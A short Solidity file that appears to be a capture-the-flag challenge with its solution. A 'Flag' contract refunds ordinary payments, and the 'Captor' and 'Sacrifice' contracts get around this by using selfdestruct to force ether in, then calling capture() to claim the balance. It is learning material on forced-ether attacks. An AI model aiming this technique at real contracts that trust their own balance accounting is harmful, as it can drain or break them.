pragma solidity ^0.4.15;

contract Flag {
    mapping (address => bool) public captured;

    event LogSneakedUpOn(address indexed who, uint howMuch);
    event LogCaptured(address indexed who, bytes32 braggingRights);

    function Flag() public {
    }

    function sneakUpOn() public payable {
        LogSneakedUpOn(msg.sender, msg.value);
        msg.sender.transfer(msg.value);
    }

    function capture(bytes32 braggingRights) public {
        require(this.balance > 0);
        captured[msg.sender] = true;
        LogCaptured(msg.sender, braggingRights);
        msg.sender.transfer(this.balance);
    }
}

contract Captor {
    address owner;
    
    function Captor() public {
        owner = msg.sender;
    }
    
    // flag contract will pay this function upon capture
    function () public payable {
        refund();
    }
    
    function refund() public {
        owner.transfer(this.balance);
    }

    // selfdestructs an instance of sacrifice, then captures the flag, in one transaction
    function capture(Sacrifice sac, Flag flag, bytes32 text) public payable {
        sac.pay.value(msg.value)(flag);
        flag.capture(text);
    }
}

contract Sacrifice {
    function Sacrifice() public {}
    
    function pay(Flag flag) public payable {
        selfdestruct(flag);
    }
}